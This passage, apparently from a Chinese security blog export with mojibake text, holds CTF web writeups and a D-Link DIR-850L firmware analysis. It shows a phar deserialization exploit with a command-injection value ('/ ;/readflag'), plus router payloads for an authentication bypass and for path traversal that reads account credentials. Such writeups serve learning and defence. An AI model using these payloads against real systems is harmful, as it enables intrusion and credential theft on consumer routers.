class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"ä¸è¢«å…è®¸çš„æ–‡ä»¶ç±»å‹"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file-&gt;xs();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Listfile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file=$file;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">listdir</span><span class="params">()</span></span>&#123;</span><br><span class="line">        system(<span class="string">"ls "</span>.<span class="keyword">$this</span>-&gt;file).<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        system(<span class="string">"ls "</span>.<span class="keyword">$this</span>-&gt;file);  <span class="comment">#ğŸ‘ˆè¿™ä¸ªåœ°æ–¹æ˜æ˜¾çš„ååºåˆ—åŒ–ï¼Œæ‰€ä»¥ä¸»è¦å°±æ˜¯æ„é€ çš„é—®é¢˜</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥æ•´ä½“é€»è¾‘ä¹Ÿå¾ˆæ¸…æ™°ï¼Œåˆ©ç”¨æ–‡ä»¶ä¸Šä¼ ä¸Šä¼ pharæ–‡ä»¶ï¼Œé€šè¿‡<a href="https://github.com/Gifts/Rogue-MySql-Server" target="_blank" rel="noopener">Rogue-MySql-Server</a>è®¿é—®pharæ–‡ä»¶è§¦å‘ååºåˆ—åŒ–</p>
<p>é¦–å…ˆæ„é€ ä¸€ä¸‹phar</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Fileupload</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $file;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;file = $file;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;file-&gt;xs();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Listfile</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $file;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;file=<span class="string">"/ ;/readflag"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        system(<span class="string">"ls "</span>.<span class="keyword">$this</span>-&gt;file);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">@unlink(<span class="string">"ccc.phar"</span>);</span></span><br><span class="line"><span class="php">$phar = <span class="keyword">new</span> Phar(<span class="string">"ccc.phar"</span>);</span></span><br><span class="line"><span class="php">$phar-&gt;startBuffering();</span></span><br><span class="line"><span class="php">$phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span></span><br><span class="line"><span class="php">$a=<span class="keyword">new</span> Listfile();</span></span><br><span class="line"><span class="php">$b=<span class="keyword">new</span> Fileupload($a);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> serialize($b);</span></span><br><span class="line"><span class="php">$phar-&gt;setMetadata($b);</span></span><br><span class="line"><span class="php">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);</span></span><br><span class="line"><span class="php">$phar-&gt;stopBuffering();</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºccc.pharåè¿›è¡Œä¸Šä¼ </p>
<p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/image-20200309180801242.png" alt></p>
<p>åœ¨vpsä¸Šç¼–è¾‘Rogue-MySql-Serverè„šæœ¬å¯åŠ¨å°±è¡Œ</p>
<p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/image-20200309180850045.png" alt></p>
<p>è¿˜æœ‰ä¸€ä¸ªé—®é¢˜å°±æ˜¯testsqlä¸­çš„optionè®¾æˆä»€ä¹ˆï¼Ÿoptionç”¨äºè®¾ç½®MYSQLI_OPT_LOCAL_INFILEï¼Œæœ¬åœ°æŸ¥çœ‹ä¸€ä¸‹</p>
<p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/image-20200309181317575.png" alt></p>
<p>æ‰€ä»¥optionè®¾ç½®ä¸º8å°±è¡Œäº†ï¼Œåˆ©ç”¨testsqlè®¿é—®æœåŠ¡å™¨ä¸Šèµ·çš„rogue_mysql_serveræœåŠ¡å°±ä¼šç›´æ¥è§¦å‘/readflag</p>
<p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/image-20200309181536562.png" alt></p>
<h3 id="0x08-nothardweb"><a href="#0x08-nothardweb" class="headerlink" title="0x08 nothardweb"></a>0x08 nothardweb</h3><p>è¿™ä¸ªæ²¡å»çœ‹ï¼Œå…·ä½“æ€è·¯æ˜¯è·‘seedï¼ˆè¿™é‡Œæœ‰ä¸€ä¸ªéé¢„æœŸï¼‰ï¼Œå¯ä»¥ç›´æ¥æ„é€ cookieï¼Œæ‰“å†…ç½‘ï¼Œä¹‹åå†…ç½‘è¿˜æœ‰ä¸€ä¸ªtomcatï¼Œå¤ç°åå†™</p>
<h3 id="0x09-easy-trick-gzmtu"><a href="#0x09-easy-trick-gzmtu" class="headerlink" title="0x09 easy_trick_gzmtu"></a>0x09 easy_trick_gzmtu</h3><p>SQLæ³¨å…¥åï¼Œå¤ç°å†™</p>
]]></content>
      <categories>
        <category>Cyc1eçš„CTFä¹‹è·¯</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>å°ç™½çš„è·¨æ–¹å‘IoT DIR850L-A1å›ºä»¶æ¼æ´åˆ†æ</title>
    <url>/2020/03/04/%E5%B0%8F%E7%99%BD%E7%9A%84%E8%B7%A8%E6%96%B9%E5%90%91IoT-DIR850L-A1%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="å›ºä»¶ä¸‹è½½"><a href="#å›ºä»¶ä¸‹è½½" class="headerlink" title="å›ºä»¶ä¸‹è½½"></a>å›ºä»¶ä¸‹è½½</h1><p>æˆ‘æ˜¯åˆ°å®˜ç½‘çš„æŸ¥è¯¢ä¸‹è½½çš„ï¼Œä¸‹è½½åœ°å€ï¼š<a href="http://support.dlink.com.cn/ProductInfo.aspx?m=DIR-850L" target="_blank" rel="noopener">http://support.dlink.com.cn/ProductInfo.aspx?m=DIR-850L</a><br>ä¹Ÿå¯ä»¥ç›´æ¥åˆ°ftpæœåŠ¡å™¨ä¸Šä¸‹è½½ï¼š<a href="ftp://ftp2.dlink.com/PRODUCTS/DIR-850L/REVA/DIR-850L_REVA_FIRMWARE_1.14.B07_WW.ZIP" target="_blank" rel="noopener">ftp://ftp2.dlink.com/PRODUCTS/DIR-850L/REVA/DIR-850L_REVA_FIRMWARE_1.14.B07_WW.ZIP</a></p>
<h1 id="å›ºä»¶è§£å‹"><a href="#å›ºä»¶è§£å‹" class="headerlink" title="å›ºä»¶è§£å‹"></a>å›ºä»¶è§£å‹</h1><p>ä¸‹è½½çš„binæ–‡ä»¶åˆ©ç”¨binwalkè¿›è¡Œè§£å‹</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">binwalk -Me <span class="module-access"><span class="module"><span class="identifier">DIR850L_FW113WWb01_f4if</span>.</span></span>bin</span><br></pre></td></tr></table></figure>
<p>èµ·æ–‡ä»¶ç³»ç»Ÿçš„è·¯å¾„ä¸º</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">/<span class="module-access"><span class="module"><span class="identifier">_DIR850L_FW113WWb01_f4if</span>.</span></span>bin.extracted/squashfs-root</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­webæœåŠ¡æ”¾ç½®äºhtdocsä¸­ï¼Œæˆ‘æ˜¯è¿›è¡Œç™½ç›’è·Ÿç€æ—©å‰çš„åˆ†ææ–‡ç« è¿›è¡Œåˆ†æï¼Œæ‰€ä»¥å°†æ–‡ä»¶å¤¹æ‰“åŒ…åˆ°æœ¬åœ°æŸ¥çœ‹ä»£ç ã€‚</p>
<h1 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h1><p>æ¼æ´åˆ†æå¾—å‰ææ˜¯è¦ä¼šç”¨idaé€†å‘cgiæ–‡ä»¶æ¥åˆ†æwebæœåŠ¡è°ƒç”¨é€»è¾‘ã€‚</p>
<h3 id="0x01-getcfg-php-ä»»æ„æ–‡ä»¶è¯»å–"><a href="#0x01-getcfg-php-ä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="0x01 getcfg.php ä»»æ„æ–‡ä»¶è¯»å–"></a>0x01 getcfg.php ä»»æ„æ–‡ä»¶è¯»å–</h3><p>æŸ¥çœ‹\htdocs\web\getcfg.phpçš„æºä»£ç ğŸ‘‡</p>
<p><img src="/2020/03/04/%E5%B0%8F%E7%99%BD%E7%9A%84%E8%B7%A8%E6%96%B9%E5%90%91IoT-DIR850L-A1%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-982fa7a4d7c2e2c5.png" alt></p>
<p>è¿™ä¸ªä»£ç é€»è¾‘ç‰¹åˆ«ç®€å•äº†ï¼Œå°±æ˜¯SERVICESå‚æ•°çš„å€¼ä¼ å…¥å˜é‡$GETCFG_SVCä¸­ï¼Œæœ€åæ‹¼æ¥åˆ°äº†å˜é‡$fileä¸­ï¼Œåˆ©ç”¨dophpå‡½æ•°ç»™loadå‡ºæ¥äº†ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥æ§åˆ¶SERVICESçš„å€¼ï¼Œå³å¯ä»¥æ§åˆ¶fileæŒ‡å‘çš„æ–‡ä»¶ï¼Œè™½ç„¶è¯´åé¢æ‹¼æ¥äº†â€™.xml.phpâ€™ï¼Œä¸è¿‡è™½ç„¶äº‹å°ç™½çš„æˆ‘ä¹ŸçŸ¥é“åç¼€ä¸ºâ€™.xml.phpâ€™æœ‰ç®¡ç†å‘˜ä¿¡æ¯çš„æ–‡ä»¶~ï¼Œä¸è¿‡æ˜¾ç„¶è¿™æ˜¯ä¸€ä¸ªelseæ¡ä»¶è§¦å‘çš„ä»£ç ï¼Œæ‰€ä»¥çœ‹ä¸€ä¸‹å‰é¢çš„ifæ¡ä»¶ğŸ‘‡</p>
<p><img src="/2020/03/04/%E5%B0%8F%E7%99%BD%E7%9A%84%E8%B7%A8%E6%96%B9%E5%90%91IoT-DIR850L-A1%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-cd9a505e1f416663.png" alt></p>
<p>è¿™é‡Œéœ€è¦åˆ¤æ–­ä¸€ä¸ªAUTHORIZED_GROUPçš„å€¼å’ŒCACHEï¼ŒCACHEçš„ç®€å•ï¼Œä¸è¾“å…¥æˆ–è€…ä¸ä¸ºTrueå°±å¥½äº†ï¼ŒAUTHORIZED_GROUPè¿™ä¸ªå°±è¦æ¶‰åŠåˆ°åˆ†æcgiçš„äº‹äº†ï¼Œå…¶ä¸­cgibinæ–‡ä»¶æ˜¯è´Ÿè´£è§£æphpçš„ï¼Œå‚è€ƒ<a href="https://www.anquanke.com/post/id/175625æ¥è¿›è¡Œåˆ†æï¼ˆæ¯•ç«Ÿä¸€ä¸ªIoTå°ç™½å¾—å…ˆè·Ÿç€ä¸€æ­¥ä¸€æ­¥æ¥ï¼‰ğŸ‘‡" target="_blank" rel="noopener">https://www.anquanke.com/post/id/175625æ¥è¿›è¡Œåˆ†æï¼ˆæ¯•ç«Ÿä¸€ä¸ªIoTå°ç™½å¾—å…ˆè·Ÿç€ä¸€æ­¥ä¸€æ­¥æ¥ï¼‰ğŸ‘‡</a></p>
<p><img src="/2020/03/04/%E5%B0%8F%E7%99%BD%E7%9A%84%E8%B7%A8%E6%96%B9%E5%90%91IoT-DIR850L-A1%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-0fdf3218d2af148e.png" alt></p>
<p>é€šè¿‡sess_validateæ¥è§£æéªŒè¯AUTHORIZED_GROUPå˜é‡å€¼ï¼Œå¹¶é€šè¿‡sprintfå¤„ç†ä½œä¸ºå…¨å±€å˜é‡ï¼Œä¹‹åè°ƒç”¨äº†sobj_add_stringå’Œsobj_add_charï¼Œç”±äºåœ¨è°ƒç”¨ sobj_add_char å‡½æ•°æ—¶ï¼Œä¼šç”¨æ¢è¡Œç¬¦æ¥åˆ†éš”å‚æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´æ„é€  %0aAUTHORIZED_GROUP=1 å³AUTHORIZED_GROUPä¼šå½“ä½œå‚æ•°å¤„ç†ï¼Œå¤„ç†åå¹¶ä½œä¸ºå…¨å±€å˜é‡ï¼Œæ‰€ä»¥ä¹Ÿå°±å¯ä»¥ç”¨æ¥ç»•è¿‡is_power_userå‡½æ•°çš„èº«ä»½æ£€éªŒï¼Œæ‰€ä»¥payloadå¯ä»¥ä¸ºğŸ‘‡</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="attribute">SERVICES</span>=DEVICE.ACCOUNT&amp;[éšä¾¿å•¥éƒ½è¡Œ]=%<span class="attribute">0aAUTHORIZED_GROUP</span>=1</span><br></pre></td></tr></table></figure>
<p>å°±å¯ä»¥è§¦å‘ç›¸å…³é€»è¾‘ä»£ç ï¼Œå®ç°ä»»æ„æ–‡ä»¶è¯»å–ã€‚</p>
<h3 id="0x02-fatlady-php-ä»»æ„æ–‡ä»¶è¯»å–"><a href="#0x02-fatlady-php-ä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="0x02 fatlady.php ä»»æ„æ–‡ä»¶è¯»å–"></a>0x02 fatlady.php ä»»æ„æ–‡ä»¶è¯»å–</h3><p>ç”±äºç”¨æˆ·å‘hedwig.cgiå‘é€xmlæ•°æ®æ—¶ï¼Œhedwig.xmlä¼šè°ƒç”¨fatlady.php æ–‡ä»¶è¿›è¡Œå¤„ç†ï¼ŒæŸ¥çœ‹fatlady.phpæ–‡ä»¶ä»£ç ï¼Œè·¯å¾„\htdocs\webinc\fatlady.phpğŸ‘‡</p>
<p><img src="/2020/03/04/%E5%B0%8F%E7%99%BD%E7%9A%84%E8%B7%A8%E6%96%B9%E5%90%91IoT-DIR850L-A1%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-219b62810a831de4.png" alt></p>
<p>åŒç†ï¼Œserviceç›´æ¥æ‹¼æ¥åˆ°äº†å˜é‡$targetä¸Šï¼Œä¹‹åè°ƒç”¨dophpè¿›è¡Œloadï¼Œå¯¼è‡´ç›´æ¥è¯»å–ä»»æ„ä»¥phpä¸ºåç¼€çš„æ–‡ä»¶ï¼ŒåŒä¸Šï¼Œæˆ‘ä»¬å¯ä»¥è¯»å–DEVICE.ACCOUNT.xml.phpæ–‡ä»¶ï¼Œå³åˆ©ç”¨serviceè¿›è¡Œè·¨ç›®å½•è¯»å–ï¼Œä¾‹å¦‚æ„é€ serviceçš„å€¼ä¸º../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xmlï¼Œè¿™é‡ŒPOST æ•°æ®åŒ…ä¸­ xml æ•°æ®å¸¦ä¸Š postxmlæ ‡ç­¾å³å¯ï¼Œå¦‚ğŸ‘‡</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="params">&lt;?xml version "<span class="number">1.0</span>" encoding "utf<span class="number">-8</span>"&gt;</span><span class="params">&lt;postxml&gt;</span><span class="params">&lt;module&gt;</span><span class="params">&lt;service&gt;</span>../../..<span class="meta-keyword">/htdocs/</span>webinc<span class="meta-keyword">/getcfg/</span>DEVICE.ACCOUNT.xml<span class="params">&lt;/service&gt;</span><span class="params">&lt;/module&gt;</span><span class="params">&lt;/postxml&gt;</span></span><br></pre></td></tr></table></figure>
<p>å‘é€xmlæ•°æ®ï¼Œå°†headerä¸­çš„Content-Typeè®¾ç½®ä¸ºtext/xmlå³å¯ã€‚</p>
<p><strong>æœªå®Œå¾…ç»­ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</strong></p>
]]></content>
      <categories>
        <category>Cyc1eçš„æ¼æ´åˆ†æä¹‹è·¯</category>
      </categories>
      <tags>
        <tag>ä»£ç å®¡è®¡</tag>
        <tag>IoT</tag>
      </tags>
  </entry>
  <entry>
    <title>OGeekå†³èµ›ä¸¤é“Webæ€»ç»“åˆ†æ</title>
    <url>/2019/09/26/OGeek%E5%86%B3%E8%B5%9B%E4%B8%A4%E9%81%93Web%E6%80%BB%E7%BB%93%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p><strong>å¾ˆä¹…æ²¡æœ‰æ‰“æ”»é˜²èµ›äº†ï¼Œè‡´åŠ›äºå†™å‡ºPerfectæ–‡ä»¶ç›‘æ§è„šæœ¬æˆ‘åœ¨è¿™æ¬¡æ¯”èµ›ç¿»è½¦äº†ï¼ŒæœåŠ¡å™¨æ²¡æœ‰pytyon2ç¯å¢ƒï¼Œæ‰€ä»¥å›æ¥æ›´æ–°æˆäº†python3äº†ï¼Œæ—…æ¸¸é˜Ÿä¼æ„å¤–æ‹¿äº†ä¸ªå­£å†›ï¼Œæ€»çš„æ¥è¯´èµä¸€ä¸‹è¿™æ¬¡æ¯”èµ›ï¼Œä½“éªŒè¿˜æ˜¯ä¸é”™çš„ï¼Œå°å°æ€»ç»“ä¸€ä¸‹å†³èµ›çš„Webï¼ˆåœºä¸Šå¼Ÿå¼Ÿï¼Œèµ›ååˆ†æï¼Œä¸ä¼šjavaï¼Œæ¼æ´ä¹Ÿè‚¯å®šæ²¡æ‰¾å…¨ï¼Œæ¬¢è¿å¸ˆå‚…è´´ä¸ªæ–‡ç« å­¦ä¹ ä¸€æ³¢ï¼‰pythonå’Œphpé¢˜ç›®æºç ä¸‹è½½åœ°å€ï¼š<a href="https://pan.baidu.com/s/1DdmgtN0cZpGsX_q1j-ooTQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1DdmgtN0cZpGsX_q1j-ooTQ</a> æå–ç : 1jpa</strong></p>
<h2 id="0x01-mOtrix"><a href="#0x01-mOtrix" class="headerlink" title="0x01 mOtrix"></a>0x01 mOtrix</h2><p>ä¸€é“pythoné¢˜ï¼Œè¿™é‡Œè´´ä¸‹æºç </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template,send_from_directory, make_response</span><br><span class="line"><span class="keyword">from</span> Archives <span class="keyword">import</span> Archives</span><br><span class="line"><span class="keyword">import</span> pickle,base64,os</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Environment</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span><br><span class="line"><span class="keyword">import</span> numpy</span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">Jinja2 = Environment()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_str</span><span class="params">(type,str)</span>:</span></span><br><span class="line">    retstr = <span class="string">"%s'%s'"</span>%(type,str)</span><br><span class="line">    print(retstr)</span><br><span class="line">    <span class="keyword">return</span> eval(retstr)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_cookie</span><span class="params">()</span>:</span></span><br><span class="line">    check_format = [<span class="string">'class'</span>,<span class="string">'+'</span>,<span class="string">'getitem'</span>,<span class="string">'request'</span>,<span class="string">'args'</span>,<span class="string">'subclasses'</span>,<span class="string">'builtins'</span>,<span class="string">'&#123;'</span>,<span class="string">'&#125;'</span>]</span><br><span class="line">    <span class="keyword">return</span> choice(check_format)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> Archives</span><br><span class="line">    resp = make_response(render_template(<span class="string">'index.html'</span>, Archives = Archives))</span><br><span class="line">    cookies = bytes(get_cookie(), encoding = <span class="string">"utf-8"</span>)</span><br><span class="line">    value = base64.b64encode(cookies)</span><br><span class="line">    resp.set_cookie(<span class="string">"username"</span>, value=value)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/Archive/&lt;int:id&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Archive</span><span class="params">(id)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> Archives</span><br><span class="line">    <span class="keyword">if</span> id&gt;len(Archives):</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'message.html'</span>, msg=<span class="string">'æ–‡ç« IDä¸å­˜åœ¨ï¼'</span>, status=<span class="string">'å¤±è´¥'</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'Archive.html'</span>,Archive = Archives[id])</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/message',methods=['POST','GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">message</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'message.html'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        type = request.form[<span class="string">'type'</span>][:<span class="number">1</span>]</span><br><span class="line">        msg = request.form[<span class="string">'msg'</span>]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            info = base64.b64decode(request.cookies.get(<span class="string">'user'</span>))</span><br><span class="line">            info = pickle.loads(info)</span><br><span class="line">            username = info[<span class="string">"name"</span>]</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">            username = <span class="string">"Guest"</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> len(msg)&gt;<span class="number">27</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'message.html'</span>, msg=<span class="string">'ç•™è¨€å¤ªé•¿äº†ï¼'</span>, status=<span class="string">'ç•™è¨€å¤±è´¥'</span>)</span><br><span class="line">        msg = msg.replace(<span class="string">' '</span>,<span class="string">''</span>)</span><br><span class="line">        msg = msg.replace(<span class="string">'_'</span>, <span class="string">''</span>)</span><br><span class="line">        retstr = set_str(type,msg)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'message.html'</span>,msg=retstr,status=<span class="string">'%s,ç•™è¨€æˆåŠŸ'</span>%username)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/hello',methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></span><br><span class="line">    username = request.cookies.get(<span class="string">'username'</span>)</span><br><span class="line">    username = str(base64.b64decode(username), encoding = <span class="string">"utf-8"</span>)</span><br><span class="line">    data = Jinja2.from_string(<span class="string">"Hello , "</span> + username + <span class="string">'!'</span>).render()</span><br><span class="line">    is_value = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'hello.html'</span>, msg=data,is_value=is_value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/getvdot',methods=['POST','GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getvdot</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'getvdot.html'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        matrix1 = base64.b64decode(request.form[<span class="string">'matrix1'</span>])</span><br><span class="line">        matrix2 = base64.b64decode(request.form[<span class="string">'matrix2'</span>])</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            matrix1 = numpy.loads(matrix1)</span><br><span class="line">            matrix2 = numpy.loads(matrix2)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">        result = numpy.vdot(matrix1,matrix2)</span><br><span class="line">        print(result)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'getvdot.html'</span>,msg=result,status=<span class="string">'å‘é‡ç‚¹ç§¯'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/robots.txt',methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">texts</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> send_from_directory(<span class="string">'/'</span>, <span class="string">'flag'</span>, as_attachment=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="string">'5000'</span>,debug=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#æˆ‘åº”è¯¥æ²¡åœ¨è¿™ä¸Šé¢åŠ¨è¿‡</span></span><br></pre></td></tr></table></figure>
<p>è¿™é¢˜çš„æ´æ¯”è¾ƒå¤šä¹Ÿå¾ˆæ˜æ˜¾ï¼Œå¼€åœºå°±æ‰“é£äº†ï¼Œåœ¨è¿™ä¸Šé¢ç¿»è½¦çš„ï¼Œä¹Ÿåœ¨è¿™ä¸Šé¢è–…äº†ä¸å°‘åˆ†â€¦â€¦</p>
<h4 id="1-å†…ç½®åé—¨"><a href="#1-å†…ç½®åé—¨" class="headerlink" title="1.å†…ç½®åé—¨"></a>1.å†…ç½®åé—¨</h4><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">@app.route(<span class="string">'/robots.txt'</span>,methods=[<span class="string">'GET'</span>])</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">texts</span><span class="params">()</span></span><span class="symbol">:</span></span><br><span class="line">    <span class="keyword">return</span> send_from_directory(<span class="string">'/'</span>, <span class="string">'flag'</span>, as_attachment=True)</span><br></pre></td></tr></table></figure>
<p>ç›´æ¥è¯»flagæ–‡ä»¶åˆ°robots.txtæ–‡ä»¶äº†ï¼Œæ‰€ä»¥ç›´æ¥è®¿é—®/robots.txtå°±æ‹¿åˆ°flagäº†ã€‚</p>
<h4 id="2-ä»£ç æ‹¼æ¥"><a href="#2-ä»£ç æ‹¼æ¥" class="headerlink" title="2.ä»£ç æ‹¼æ¥"></a>2.ä»£ç æ‹¼æ¥</h4><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_str</span></span>(<span class="class"><span class="keyword">type</span>,<span class="title">str</span>)</span>:</span><br><span class="line">    retstr = <span class="string">"%s'%s'"</span>%(<span class="class"><span class="keyword">type</span>,<span class="title">str</span>)</span></span><br><span class="line"><span class="class">    <span class="title">print</span>(<span class="params">retstr</span>)</span></span><br><span class="line"><span class="class">    <span class="title">return</span> <span class="title">eval</span>(<span class="params">retstr</span>)</span></span><br></pre></td></tr></table></figure>
<p>set_stråœ¨/messageå¤„è¿›è¡Œäº†è°ƒç”¨ï¼Œå…¶ä¸­å˜é‡strå–å€¼msgï¼Œåªè¿›è¡Œäº†ç®€å•çš„å¤„ç†</p>
